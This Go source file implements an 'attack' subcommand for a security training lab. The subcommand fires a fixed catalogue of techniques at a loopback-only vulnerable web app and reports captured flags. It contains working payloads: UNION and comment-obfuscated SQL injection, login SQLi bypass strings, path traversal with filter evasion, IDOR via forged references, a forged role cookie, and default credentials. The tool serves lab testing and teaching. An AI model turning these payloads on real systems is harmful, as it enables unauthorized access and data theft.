// attack: a self-contained validator that runs the training exploit catalogue against a seclab
// vulnweb target and reports which techniques land. For checking the defenses of your OWN lab.
//
// Scope is enforced here, not by convention: the target MUST be http://127.0.0.1:<port> or
// http://localhost:<port>. Any other host is refused. Payloads are a fixed built-in catalogue of
// teaching techniques against seclab's own vulnweb app; none are taken from the command line.
//
//	seclab-agent attack -target http://127.0.0.1:8081 [-only sqli,idor,traversal,admin,creds] [-json]
package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strings"
	"time"
)

var flagRe = regexp.MustCompile(`FLAG\{[a-z]+-[0-9a-f]{6,}\}`)

// A technique: one concrete attempt. steps returns a captured flag (or ""), and the short label of
// what it did. Several techniques per category cover the easy->hard filters; the first that captures
// a flag wins the category.
type technique struct {
	label string
	run   func(c *attacker) (flag string, detail string)
}

type attacker struct {
	base string
	cli  *http.Client
}

type Finding struct {
	Category  string `json:"category"`
	Technique string `json:"technique"`
	Captured  bool   `json:"captured"`
	Flag      string `json:"flag,omitempty"`
	Detail    string `json:"detail"`
}

func newAttacker(base string) *attacker {
	jar, _ := cookiejar.New(nil)
	return &attacker{base: strings.TrimRight(base, "/"),
		cli: &http.Client{Jar: jar, Timeout: 8 * time.Second,
			CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}}
}

func (c *attacker) get(path string) string {
	r, err := c.cli.Get(c.base + path)
	if err != nil {
		return ""
	}
	defer r.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	return string(b)
}

func (c *attacker) postLogin(user, pass string) {
	c.cli.PostForm(c.base+"/login", url.Values{"username": {user}, "password": {pass}})
}

func (c *attacker) freshJar() {
	jar, _ := cookiejar.New(nil)
	c.cli.Jar = jar
}

// Catalogue. Each category lists techniques from the most basic to the one that beats the hardest
// filter; the runner stops a category at the first captured flag.
func catalogue() map[string][]technique {
	find := func(body string) string { return flagRe.FindString(body) }
	return map[string][]technique{
		"sqli": {
			{"UNION on search (spaces)", func(c *attacker) (string, string) {
				b := c.get("/directory?q=" + url.QueryEscape("zz' UNION SELECT name, value FROM secrets WHERE name LIKE '"))
				return find(b), "classic UNION in the directory search"
			}},
			{"UNION with inline comments", func(c *attacker) (string, string) {
				b := c.get("/directory?q=" + url.QueryEscape("zz'/**/UNION/**/SELECT/**/name,value/**/FROM/**/secrets/**/WHERE/**/name/**/LIKE/**/'"))
				return find(b), "/**/ comments bypass the keyword filter"
			}},
		},
		"idor": {
			{"direct note id", func(c *attacker) (string, string) {
				c.freshJar()
				c.postLogin("j.doe", "summer2024")
				return find(c.get("/notes?id=1")), "another user's note by sequential id"
			}},
			{"base64 note ref", func(c *attacker) (string, string) {
				c.freshJar()
				c.postLogin("j.doe", "summer2024")
				return find(c.get("/notes?ref=" + noteRef(1))), "forged base64 note:1 reference"
			}},
			{"anonymous note", func(c *attacker) (string, string) {
				c.freshJar()
				return find(c.get("/notes?id=1")), "note readable without login"
			}},
		},
		"traversal": {
			{"../ escape", func(c *attacker) (string, string) {
				return find(c.get("/files?name=" + url.QueryEscape("../private/flag.txt"))), "plain ../ outside the web root"
			}},
			{"....// collapse", func(c *attacker) (string, string) {
				return find(c.get("/files?name=" + url.QueryEscape("....//private/flag.txt"))), "....// survives one strip of ../"
			}},
			{"double URL-encoding", func(c *attacker) (string, string) {
				return find(c.get("/files?name=%252e%252e%252fprivate%252fflag.txt")), "second decode re-introduces ../"
			}},
		},
		"admin": {
			{"default creds admin:admin", func(c *attacker) (string, string) {
				c.freshJar()
				c.postLogin("admin", "admin")
				return find(c.get("/admin")), "default admin password"
			}},
			{"leaked backup creds", func(c *attacker) (string, string) {
				bak := c.get("/backup/config.bak")
				i := strings.Index(bak, "password=")
				if i < 0 {
					return "", "no readable /backup/config.bak"
				}
				pw := strings.TrimSpace(bak[i+len("password="):])
				c.freshJar()
				c.postLogin("admin", pw)
				return find(c.get("/admin")), "admin password from exposed backup"
			}},
			{"SQLi auth bypass to admin", func(c *attacker) (string, string) {
				// username, password: for the comment payloads the comment swallows the password clause;
				// for the OR payload both fields carry it so either half of the query is true.
				for _, inj := range [][2]string{{"admin'-- ", "x"}, {"admin'#", "x"},
					{"x'/**/OR/**/'a'='a", "x'/**/OR/**/'a'='a"}} {
					c.freshJar()
					c.postLogin(inj[0], inj[1])
					if f := find(c.get("/admin")); f != "" {
						return f, "login SQLi lands an admin session"
					}
				}
				return "", "login SQLi filtered"
			}},
			{"forged role cookie", func(c *attacker) (string, string) {
				c.freshJar()
				if u, err := url.Parse(c.base); err == nil {
					c.cli.Jar.SetCookies(u, []*http.Cookie{{Name: "role", Value: "admin", Path: "/"}})
				}
				return find(c.get("/admin")), "client-side role cookie trusted"
			}},
		},
		"creds": {
			{"weak SSH-style login", func(c *attacker) (string, string) {
				// Against the web app this just confirms weak web creds; SSH creds are exercised by the lab, not here.
				for _, p := range []struct{ u, p string }{{"admin", "admin"}, {"admin", "Winter2026!"}} {
					c.freshJar()
					c.postLogin(p.u, p.p)
					if f := find(c.get("/admin")); f != "" {
						return f, "guessable admin password " + p.p
					}
				}
				return "", "admin password not guessable"
			}},
		},
	}
}

func runCategory(c *attacker, techs []technique) Finding {
	var last Finding
	for _, t := range techs {
		flag, detail := t.run(c)
		last = Finding{Technique: t.label, Captured: flag != "", Flag: flag, Detail: detail}
		if flag != "" {
			return last
		}
	}
	return last // none landed: report the last attempt so the user sees it was tried
}

func validTarget(target string) (string, error) {
	u, err := url.Parse(target)
	if err != nil {
		return "", fmt.Errorf("bad target URL: %w", err)
	}
	if u.Scheme != "http" {
		return "", fmt.Errorf("target must be http:// on loopback")
	}
	host := u.Hostname()
	if host != "127.0.0.1" && host != "localhost" {
		return "", fmt.Errorf("refused: target host %q is not loopback; this runs only against your own lab", host)
	}
	if u.Port() == "" {
		return "", fmt.Errorf("target must include a port, e.g. http://127.0.0.1:8081")
	}
	// Belt and braces: resolve and confirm loopback.
	if ips, _ := net.LookupIP(host); host == "localhost" {
		for _, ip := range ips {
			if !ip.IsLoopback() {
				return "", fmt.Errorf("refused: localhost resolves off loopback")
			}
		}
	}
	return target, nil
}

func runAttack(args []string) int {
	fs := flag.NewFlagSet("attack", flag.ContinueOnError)
	target := fs.String("target", "", "http://127.0.0.1:<port> of a vulnweb site in YOUR lab")
	only := fs.String("only", "", "comma list of categories to run (default: all)")
	asJSON := fs.Bool("json", false, "machine-readable output")
	if err := fs.Parse(args); err != nil {
		return 2
	}
	base, err := validTarget(*target)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		return 2
	}
	cat := catalogue()
	want := map[string]bool{}
	if *only != "" {
		for _, c := range strings.Split(*only, ",") {
			c = strings.TrimSpace(c)
			if _, ok := cat[c]; !ok {
				fmt.Fprintf(os.Stderr, "unknown category %q\n", c)
				return 2
			}
			want[c] = true
		}
	}
	cats := make([]string, 0, len(cat))
	for name := range cat {
		if len(want) == 0 || want[name] {
			cats = append(cats, name)
		}
	}
	sort.Strings(cats)

	c := newAttacker(base)
	var out []Finding
	for _, name := range cats {
		f := runCategory(c, cat[name])
		f.Category = name
		out = append(out, f)
	}
	if *asJSON {
		json.NewEncoder(os.Stdout).Encode(out)
		return 0
	}
	captured := 0
	for _, f := range out {
		mark := "—"
		if f.Captured {
			mark = "HIT"
			captured++
		}
		fmt.Printf("%-3s %-10s %-28s %s %s\n", mark, f.Category, f.Technique, f.Flag, f.Detail)
	}
	fmt.Printf("\n%d/%d categories captured a flag\n", captured, len(out))
	return 0
}
